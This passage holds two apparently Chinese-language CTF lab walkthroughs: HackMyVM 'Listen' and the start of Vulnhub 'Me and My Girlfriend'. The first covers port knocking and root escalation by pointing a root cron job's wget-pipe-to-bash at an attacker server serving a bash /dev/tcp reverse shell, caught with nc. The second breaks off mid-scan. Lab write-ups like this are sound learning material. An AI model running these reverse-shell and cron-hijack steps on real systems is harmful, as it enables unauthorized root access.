<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.158       </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-08</span> <span class="number">10</span>:<span class="number">13</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line">Host is up (<span class="number">0.0022</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp filtered <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">56</span>:<span class="number">6</span>C:<span class="number">79</span>:<span class="number">7</span>A:<span class="number">84</span>:<span class="number">65</span> (Unknown)</span><br><span class="line">Too many fingerprints match this host <span class="built_in">to</span> give specific OS details</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.22</span> ms <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">3.20</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>webé¦–é¡µæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.169.179.158    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;URL=/cgi-sys/defaultwebpage.cgi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>åšä¹‹å‰ç¾¤ä¸»æœ‰æé†’ï¼ŒListenè¿™ä¸ªåå­—å°±æ˜¯è¦æµé‡ç›‘å¬ï¼Œæ‰€ä»¥ç”¨wireshark<br>wiresharkè¿™ä¸ªåº”ç”¨æˆ‘ç›´æ¥æ‰“å¼€ç›‘å¬ï¼Œæç¤ºæˆ‘æƒé™ä¸è¶³ï¼Œæœç´¢åç”¨sudoæ‰“å¼€ ï¼ˆmacç³»ç»Ÿï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="meta">@bogon</span> <span class="regexp">/Applications % sudo /</span><span class="type">Applications</span><span class="regexp">/Wireshark.app/</span><span class="type">Contents</span><span class="regexp">/MacOS/</span><span class="type">Wireshark</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67a6cd6fd0e0a243d4fce6f1.png"><br>æŠ“åŒ…åç­›é€‰é¶æœºçš„ipï¼ŒæŸ¥çœ‹åŒ…å†…å®¹ï¼Œå‘ç°éœ€è¦knock 1337ç«¯å£ï¼Œç”¨åˆ°äº†knockæœåŠ¡ï¼Œæˆ‘è¦å»ä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªé…ç½®<br>å› ä¸ºå¼€æœºå‰è·å–ä¸åˆ°ipï¼Œä¿®æ”¹äº†é¶æœºç½‘å¡ï¼Œknocké…ç½®ä¹Ÿè¦æ”¹ ä½ç½®åœ¨&#x2F;etc&#x2F;knockd.conf<br><img src="https://pic1.imgdb.cn/item/67a6cd6bd0e0a243d4fce6ef.png"><br>å¦ä¸€ä¸ªåŒ…ç»™äº†ç”¨æˆ·åå’Œå¯†ç <br>konckè¿™ä¸ªç«¯å£ä¹‹åï¼Œé¶æœºçš„22å’Œ80ç«¯å£å°±éƒ½æ‰“å¼€äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># knock 192.168.179.158 1337 -v          </span></span><br><span class="line">hitting tcp <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>:<span class="number">1337</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -p- 192.168.179.158</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-08</span> <span class="number">10</span>:<span class="number">29</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line">Host is up (<span class="number">0.00061</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">56</span>:<span class="number">6</span>C:<span class="number">79</span>:<span class="number">7</span>A:<span class="number">84</span>:<span class="number">65</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.77</span> <span class="built_in">seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå°±å¯ä»¥ç”¨sshç™»å½•åˆ°silenceç”¨æˆ·</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æ²¡æœ‰sudoæƒé™<br>ä½†æ˜¯suidæœ‰ä¸€ä¸ªhomeç›®å½•ä¸‹leoç”¨æˆ·çš„æ–‡ä»¶æœ‰suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">silence<span class="variable">@listen</span>:~<span class="variable">$ </span>find / -perm -<span class="number">4000</span> -user root -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/home/leo</span><span class="regexp">/poem</span></span><br><span class="line"><span class="regexp">silence@listen:~$ cd /home</span></span><br><span class="line">silence<span class="variable">@listen</span>:<span class="regexp">/home$ ls</span></span><br><span class="line"><span class="regexp">leo  listen  silence</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">silence<span class="variable">@listen</span><span class="symbol">:/home</span><span class="variable">$ </span>cd silence/</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">listen.sh  note.txt</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>listen.sh</span><br><span class="line">-<span class="symbol">bash:</span> <span class="symbol">listen.sh:</span> command <span class="keyword">not</span> found</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>cat note.txt </span><br><span class="line"><span class="string">&quot;listen&quot;</span> told me that <span class="keyword">if</span> I listen, I will hear his password....</span><br></pre></td></tr></table></figure></div>
<p>æç¤ºlisten â€œlistenâ€ç”¨æˆ·å¯ä»¥å¾—åˆ°å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="code"><pre><span class="line">silence<span class="keyword">@listen</span>:~$ cat listen.sh </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">cat /home/listen/password.txt &gt; /dev/pts/<span class="number">4</span></span><br></pre></td></tr></table></figure></div>
<p>è¿è¡Œè¿™ä¸ªè„šæœ¬ä¹‹åå°±å¯ä»¥å¾—åˆ°å¯†ç ï¼Œä½†æ˜¯ç°åœ¨æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œåªæ˜¯å¯è¯»çš„<br>è¿™é‡Œå¡ä½äº†ä¸€ä¼šï¼Œçœ‹äº†ä¸‹wpï¼ŒåŸæ¥è¿™ä¸ªpts&#x2F;4 æ˜¯ç»ˆç«¯çš„çª—å£ï¼Œæ‰€ä»¥å¼€4ä¸ªç»ˆç«¯çª—å£ï¼Œåœ¨ç¬¬å››ä¸ªç»ˆç«¯ä¸­å°±èƒ½çœ‹åˆ°<br>è¿™ä¸ªåº”è¯¥æ˜¯ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œç­‰å¾…ä¸€ä¼šå°±ä¼šåœ¨ç¬¬å››ä¸ªç»ˆç«¯çª—å£ä¸­å‡ºç°å¯†ç (å¼€å››ä¸ªsshå…¨éƒ½è¿æ¥åˆ°silence)<br><img src="https://pic1.imgdb.cn/item/67a6cd85d0e0a243d4fce6f5.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>su - listen</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line">listen<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸåˆ‡æ¢åˆ°listen<br>æœ‰ä¸€ä¸ªæ–‡ä»¶ ï¼Œè€Œä¸”ç”¨pspy64å‘ç°rootä¼šå®šæ—¶æ‰§è¡Œè¿™ä¸ªlistentome.sh </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span>@listen:~$ ls</span><br><span class="line"><span class="attribute">listentome</span>.sh  password.txt  user.txt</span><br><span class="line"><span class="attribute">listen</span>@listen:~$ cat listentome.sh </span><br><span class="line"><span class="attribute">wget</span> -O - -q http://listen/ihearyou.sh | bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">07</span> <span class="number">22</span>:<span class="number">14</span>:<span class="number">02</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1070</span>   | sh /home/listen/listentome.sh </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">07</span> <span class="number">22</span>:<span class="number">14</span>:<span class="number">02</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1071</span>   | sh /home/listen/listentome.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªé©¬ä¸Šå°±æœ‰æ€è·¯äº†ï¼Œä¿®æ”¹hostï¼ŒæŠŠlistenæŒ‡å‘æˆ‘ä»¬æœ¬æœºçš„httpæœåŠ¡ï¼ŒæŠŠåå¼¹shellçš„shæ–‡ä»¶è®©é¶æœºæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">127.0.0.1</span>       localhost</span><br><span class="line"><span class="number">192.168.179.11</span>  listen</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::<span class="number">1</span>     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ctrl + o å›è½¦ ctrl + x</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># rm ihearyou.sh         </span></span><br><span class="line">                                                                                                                     </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># touch ihearyou.sh</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># cp reverse.sh ihearyou.sh</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># cat ihearyou.sh          </span></span><br><span class="line">bash -i &gt;&amp; <span class="string">/dev/tcp/192.168.179.11/1234</span> 0&gt;&amp;1</span><br><span class="line">                                                                                                                     </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 <span class="params">(http://0.0.0.0:80/)</span> <span class="string">...</span></span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨å¦ä¸€ä¸ªkaliç«¯å£ç›‘å¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234             </span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(1123): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">root@listen:~# id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line">root@listen:~# </span><br></pre></td></tr></table></figure></div>
<p>å®Œæˆ</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Me and My Girlfriend</title>
    <url>/posts/60109.html</url>
    <content><![CDATA[<p>cispç»¼åˆé¢˜ä¸¾å¾—é¶æœºä¾‹å­ï¼Œæ˜¯ä¸ªvulnhubå¾ˆè€çš„é¶æœºçš„ï¼Œåœ¨å…¶ä»–å¾ˆå¤šåœ°æ–¹ä¹Ÿè§åˆ°è¿‡ï¼Œæ­£å¥½å¤å»ºä¸€ä¸‹</p>
<span id="more"></span>
<p>é¶æœºä»‹ç»ï¼š<br>Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, â€œCeban Corpâ€, something has changed from Aliceâ€™s attitude towards Bob like something is â€œhiddenâ€, And Bob asks for your help to get what Alice is hiding and get full access to the company!</p>
<p>Difficulty Level: Beginner</p>
<p>Notes: there are 2 flag files</p>
<p>Learning: Web Application | Simple Privilege Escalation</p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap 192.168.10.139 -A</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>8-<span class="number">18</span> <span class="number">19</span>:<span class="number">43</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">10.139</span> (<span class="number">192.168</span>.<span class="number">10.139</span>)</span><br><span class="line">Host is up (<span class="number">0.00087</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">6.6</span>.<span class="number">1</span>p1 Ubuntu <span class="number">2</span>ubuntu2.<span class="number">13</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span></span><br><span class="line">|   <span class="number">1024</span> <span class="number">57</span>:e1:<span class="number">56</span>:<span class="number">58</span>:<span class="number">46</span>:<span class="number">04</span>:<span class="number">33</span>:<span class="number">56</span>:<span class="number">3</span>d:c3:<span class="number">4</span>b:a7:<span class="number">93</span>:ee:<span class="number">23</span>:<span class="number">16</span> (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">3</span>b:<span class="number">26</span>:<span class="number">4</span>d:e4:a0:<span class="number">3</span>b:f8:<span class="number">75</span>:d9:<span class="number">6</span>e:<span class="number">15</span>:<span class="number">55</span>:<span class="number">82</span>:<span class="number">8</span>c:<span class="number">71</span>:<span class="number">97</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">8</span>f:<span class="number">48</span>:<span class="number">97</span>:<span class="number">9</span>b:<span class="number">55</span>:<span class="number">11</span>:<span class="number">5</span>b:f1:<span class="number">6</span>c:<span class="number">1</span>d:b3:<span class="number">4</span>a:bc:<span class="number">36</span>:bd:b0 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d0:c3:<span class="number">02</span>:a1:c4:c2:a8:ac:<span class="number">3</span>b:<span class="number">84</span>:ae:<span class="number">8</span>f:e5:<span class="number">79</span>:<span class="number">66</span>:<span class="number">76</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">7</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.7</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">63</span>:<span class="number">6</span>B:<span class="number">88</span> (VMware)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">3</span>.X|<span class="number">4</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">3</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">3.2</span> <span class="operator">-</span> <span class="number">4.14</span></span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">0.87</span> ms <span class="number">192.168</span>.<span class="number">10.139</span> (<span class="number">192.168</span>.<span class="number">10.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">17.74</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>ç»å…¸çš„22å’Œ80ç«¯å£</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>å…ˆå»80ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.10.139</span><br><span class="line">Who are you? Hacker? Sorry This Site Can Only Be Accessed local!<span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span>  </span><br></pre></td></tr></table></figure></div>
<p>æç¤ºx-forwarded-for é‚£å°±åœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥è¿™ä¸ª è¡¨ç¤ºä»æœ¬åœ°è®¿é—®<br><img src="https://pic1.imgdb.cn/item/68a3140958cb8da5c8317c1d.png"><br>ä¿®æ”¹è¯·æ±‚å¤´ä¹‹åå°±å¯ä»¥æ­£å¸¸è®¿é—®äº†ï¼Œä½†æ˜¯æ¯æ¬¡è¦ä¿®æ”¹è¿™ä¸ªè¯·æ±‚å¤´ç‰¹åˆ«éº»çƒ¦ã€‚<br>æœ€è¿‘ä¸‹äº†ä¸€ä¸ªæ¸—é€ç‰ˆçš„firefox  é‡Œé¢æœ‰ä¸€ä¸ªæ’ä»¶å°±å¯ä»¥è®¾ç½®è¯·æ±‚å¤´<br><img src="https://pic1.imgdb.cn/item/68a3165d58cb8da5c8319135.png"><br>ç„¶åè®¿é—®å°±çœ‹åˆ°æœ‰æ³¨å†Œå’Œç™»å½•ç•Œé¢ï¼Œé‚£å°±æ³¨å†Œä¸€ä¸ªè¯•è¯•å§<br><img src="https://pic1.imgdb.cn/item/68a316ea58cb8da5c83195fb.png"><br>æ³¨å†Œè¿›æ¥ä¹Ÿå°±åªæœ‰ä¸€ä¸ªdashboardå’Œä¸€ä¸ªprofile è€Œä¸”ä¹Ÿæ²¡æœ‰å¤šä½™çš„ä¿¡æ¯<br>è¿™é‡Œçš„ä¿¡æ¯å°±æ”¶é›†äº†è¿™ä¹ˆå¤šï¼Œç„¶åå†å»ç›®å½•æ‰«æä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.10.139</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.10.139/_25-08-18_20-11-26.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">10.139</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">26</span>] <span class="params">Starting:</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">292</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">297</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">296</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">293</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">293</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">294</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">293</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">285</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">286</span>B  <span 